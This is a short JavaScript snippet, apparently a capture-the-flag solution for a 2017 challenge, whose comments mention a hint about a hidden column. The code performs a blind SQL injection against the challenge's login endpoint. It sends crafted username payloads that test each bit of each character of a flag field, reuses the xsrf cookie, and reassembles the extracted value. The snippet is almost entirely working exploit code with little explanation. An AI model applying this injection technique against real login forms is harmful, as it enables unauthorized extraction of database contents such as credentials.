// first I fetched password field for id<2 condition. it said:
// HINT:flag_is_in_this_table_and_its_columns_is_QthD2GLz_but_not_the_first_record.
// the mentioned field with id=17 contains the flag

for(i=0;i<7;i++)for(j=0;j<30;j++)f(i,j);
r=[]

function f(i,j){
jQuery.post('http://login.2017.teamrois.cn/login', {
_xsrf: document.cookie.split('xsrf=')[1].split(';')[0],
username: "'||id=17&&ord(mid(QthD2GLz,"+(j+1)+"))&" + Math.pow(2,i)+"#",
password: '1'
}, function(data){
if(data.indexOf('Invalid Username or Password!')==-1) {
r[j]|=Math.pow(2,i)
}
})
}

setInterval(()=>{console.log(String.fromCharCode.apply(this, r));}, 1000)